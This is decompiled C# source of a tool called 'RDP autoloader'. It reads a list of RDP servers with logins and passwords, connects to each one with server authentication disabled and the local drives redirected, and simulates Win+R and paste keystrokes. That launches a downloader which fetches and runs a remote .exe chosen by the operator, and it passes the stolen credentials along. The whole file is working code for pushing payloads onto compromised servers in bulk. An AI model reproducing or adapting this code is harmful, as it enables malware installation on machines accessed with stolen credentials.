// Decompiled with JetBrains decompiler
// Type: VdsFileUploader.Form1
// Assembly: VdsFileUploader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E07B404-AFB6-44C8-8A8A-653B83A195EB
// Assembly location: C:\Users\gorno\Desktop\vm\RDP Autoloader.exe

using AxMSTSCLib;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace VdsFileUploader
{
  public class Form1 : Form
  {
    private const int KEYEVENTF_EXTENDEDKEY = 1;
    private const int KEYEVENTF_KEYUP = 2;
    private const byte VK_LWIN = 91;
    private const int WM_KEYDOWN = 256;
    private const int WM_KEYUP = 257;
    private const int WM_CLOSE = 16;
    private const int WM_DESTROY = 2;
    private Queue<string> dedics;
    private bool Working;
    private string filelink;
    private IntPtr formhwnd;
    private IContainer components;
    private TextBox t1;
    private GroupBox groupBox1;
    private Button go;
    private TextBox t2;
    private AxMsRdpClient6NotSafeForScripting rdp;

    public Form1()
    {
      this.InitializeComponent();
      this.Working = false;
      this.formhwnd = this.Handle;
    }

    [DllImport("user32.dll")]
    private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

    [DllImport("user32.dll")]
    private static extern bool PostMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

    [DllImport("user32.dll")]
    private static extern bool EnumWindows(Form1.EnumWindowsProc enumProc, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern int SendMessage(IntPtr hWnd, int wMsg, uint wParam, uint lParam);

    private bool Checkrdp()
    {
      string[] array = this.dedics.ToArray();
      for (int index = 0; index < array.Length; ++index)
      {
        if (!array[index].Contains("@") || !array[index].Contains("."))
          return false;
      }
      return true;
    }

    private void go_Click(object sender, EventArgs e)
    {
      if (this.Working)
      {
        int num1 = (int) MessageBox.Show((IWin32Window) this, "Already working!");
      }
      else
      {
        this.dedics = new Queue<string>((IEnumerable<string>) this.t1.Lines);
        if (this.dedics.Count < 1)
        {
          int num2 = (int) MessageBox.Show((IWin32Window) this, "There are no rdp servers!");
        }
        else if (!this.Checkrdp())
        {
          int num3 = (int) MessageBox.Show((IWin32Window) this, "Incorrect RDP strings format!");
        }
        else if (!this.t2.Text.Contains("://") || !this.t2.Text.Contains(".exe"))
        {
          int num4 = (int) MessageBox.Show((IWin32Window) this, "Incorrect .exe link format!");
        }
        else
        {
          this.filelink = this.t2.Text;
          this.Working = true;
          Thread thread = new Thread(new ThreadStart(this.ControllerThreadProc));
          thread.IsBackground = true;
          thread.SetApartmentState(ApartmentState.STA);
          thread.Start();
        }
      }
    }

    private void ControllerThreadProc()
    {
      while (this.dedics.Count > 0)
      {
        string input = this.dedics.Dequeue();
        try
        {
          this.t1.Invoke((Delegate) (() => this.t1.Lines = this.dedics.ToArray()));
          Match match = new Regex("(?<ipport>[^\\@]+)\\@(?<logpass>.*)").Match(input);
          if (!match.Success)
            throw new Exception("Не могу распарсить дедик");
          string ip = match.Groups["ipport"].Value;
          int port = 0;
          if (ip.Contains(";") || ip.Contains(":"))
          {
            port = int.Parse(ip.Split(new char[2]
            {
              ';',
              ':'
            })[1]);
            ip = ip.Split(new char[2]{ ';', ':' })[0];
          }
          string login = match.Groups["logpass"].Value.Split(new char[2]
          {
            ';',
            ':'
          })[0];
          string pass = match.Groups["logpass"].Value.Split(new char[2]
          {
            ';',
            ':'
          })[1];
          string str = "/?log=" + input;
          this.Invoke((Delegate) (() =>
          {
            this.rdp.Server = ip;
            if (port > 0)
              this.rdp.AdvancedSettings2.RDPPort = port;
            this.rdp.UserName = login;
            this.rdp.AdvancedSettings7.ClearTextPassword = pass;
            this.rdp.AdvancedSettings7.AuthenticationLevel = 0U;
            this.rdp.AdvancedSettings7.EnableCredSspSupport = true;
            this.rdp.AdvancedSettings2.overallConnectionTimeout = 30;
            this.rdp.AdvancedSettings2.allowBackgroundInput = 1;
            this.rdp.SecuredSettings2.KeyboardHookMode = 1;
            this.rdp.ColorDepth = 16;
            this.rdp.AdvancedSettings7.RedirectDrives = true;
            this.rdp.Connect();
          }));
          int num1 = 0;
          while ((int) this.rdp.Connected != 1)
          {
            Thread.Sleep(1000);
            ++num1;
            if (num1 > 30)
              throw new Exception("Таймаут подключения");
            bool dialog = false;
            Form1.EnumWindows((Form1.EnumWindowsProc) ((wnd, param) =>
            {
              if (Form1.GetWindow(wnd, 4U) == this.formhwnd)
              {
                StringBuilder lpClassName = new StringBuilder(256);
                Form1.GetClassName(wnd, lpClassName, lpClassName.Capacity);
                if (string.Compare(lpClassName.ToString(), "#32770") == 0)
                {
                  dialog = true;
                  Thread.Sleep(300);
                  Form1.PostMessage(wnd, 273U, 2U, 0U);
                  Thread.Sleep(1000);
                  return false;
                }
                if (string.Compare(lpClassName.ToString(), "Credential Dialog Xaml Host", true) == 0)
                {
                  dialog = true;
                  Thread.Sleep(300);
                  Form1.PostMessage(wnd, 2U, 0U, 0U);
                  Form1.PostMessage(wnd, 16U, 0U, 0U);
                  Thread.Sleep(1000);
                  return false;
                }
              }
              return true;
            }), IntPtr.Zero);
            if (dialog)
              throw new Exception("Ошибка подключения (диалоговое окно, ошибка авторизации и пр)");
          }
          Thread.Sleep(12000);
          string text = "\\\\tsclient\\" + Environment.CurrentDirectory.Replace(":", "") + "\\dnr.exe " + this.filelink + " sj6O0g " + input;
          IntPtr hWindow = new IntPtr();
          this.Invoke((Delegate) (() => hWindow = this.rdp.Handle));
          Thread.Sleep(200);
          hWindow = Form1.FindWindowEx(hWindow, IntPtr.Zero, "UIMainClass", (string) null);
          hWindow = Form1.FindWindowEx(hWindow, IntPtr.Zero, "UIContainerClass", (string) null);
          hWindow = Form1.FindWindowEx(hWindow, IntPtr.Zero, "IHWindowClass", (string) null);
          KeyboardSend.KeyDown(hWindow, Keys.LWin, true);
          KeyboardSend.KeyDown(hWindow, Keys.R, false);
          KeyboardSend.KeyUp(hWindow, Keys.LWin, true);
          KeyboardSend.KeyUp(hWindow, Keys.R, false);
          Thread.Sleep(1000);
          Clipboard.SetText(text);
          Thread.Sleep(500);
          KeyboardSend.KeyDown(hWindow, Keys.ControlKey, true);
          KeyboardSend.KeyDown(hWindow, Keys.V, false);
          KeyboardSend.KeyUp(hWindow, Keys.ControlKey, true);
          KeyboardSend.KeyUp(hWindow, Keys.V, false);
          Thread.Sleep(1000);
          KeyboardSend.KeyDown(hWindow, Keys.Return, false);
          KeyboardSend.KeyUp(hWindow, Keys.Return, false);
          System.IO.File.WriteAllText("flag.dat", "flag");
          int num2 = 0;
          while (System.IO.File.Exists("flag.dat") && num2 < 60)
          {
            Thread.Sleep(1000);
            ++num2;
            if (num2 == 25)
            {
              KeyboardSend.KeyDown(hWindow, Keys.Left, true);
              Thread.Sleep(1000);
              KeyboardSend.KeyDown(hWindow, Keys.Return, false);
            }
          }
          if (num2 >= 60)
            System.IO.File.AppendAllText("bugs.txt", input + " - Не получили ответ о запуске софта\r\n");
          Thread.Sleep(2000);
        }
        catch (Exception ex)
        {
          System.IO.File.AppendAllText("bugs.txt", input + " - " + ex.Message + "\r\n");
        }
        if ((int) this.rdp.Connected > 0)
          this.rdp.Disconnect();
        while ((int) this.rdp.Connected != 0)
          Thread.Sleep(500);
        Thread.Sleep(1000);
      }
      this.Working = false;
      int num;
      this.Invoke((Delegate) (() => num = (int) MessageBox.Show((IWin32Window) this, "Done!")));
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.t1 = new TextBox();
      this.groupBox1 = new GroupBox();
      this.go = new Button();
      this.t2 = new TextBox();
      this.rdp = new AxMsRdpClient6NotSafeForScripting();
      this.groupBox1.SuspendLayout();
      this.rdp.BeginInit();
      this.SuspendLayout();
      this.t1.Dock = DockStyle.Fill;
      this.t1.Location = new Point(3, 16);
      this.t1.Multiline = true;
      this.t1.Name = "t1";
      this.t1.ScrollBars = ScrollBars.Both;
      this.t1.Size = new Size(213, 263);
      this.t1.TabIndex = 1;
      this.t1.Text = "123.123.123.123:54321@user;password";
      this.t1.WordWrap = false;
      this.groupBox1.Controls.Add((Control) this.t1);
      this.groupBox1.Location = new Point(12, 12);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Size = new Size(219, 282);
      this.groupBox1.TabIndex = 2;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "RDP servers (ip[:port]@login:pass)";
      this.go.Location = new Point(124, 323);
      this.go.Name = "go";
      this.go.Size = new Size(107, 23);
      this.go.TabIndex = 3;
      this.go.Text = "Start";
      this.go.UseVisualStyleBackColor = true;
      this.go.Click += new EventHandler(this.go_Click);
      this.t2.Location = new Point(12, 297);
      this.t2.Name = "t2";
      this.t2.Size = new Size(219, 20);
      this.t2.TabIndex = 4;
      this.t2.Text = "http://domain.com/file.exe";
      this.rdp.Enabled = true;
      this.rdp.Location = new Point(237, 17);
      this.rdp.Name = "rdp";
      this.rdp.OcxState = (AxHost.State) componentResourceManager.GetObject("rdp.OcxState");
      this.rdp.Size = new Size(800, 600);
      this.rdp.TabIndex = 5;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1048, 627);
      this.Controls.Add((Control) this.rdp);
      this.Controls.Add((Control) this.t2);
      this.Controls.Add((Control) this.go);
      this.Controls.Add((Control) this.groupBox1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = "Form1";
      this.Text = "RDP autoloader";
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      this.rdp.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
  }
}
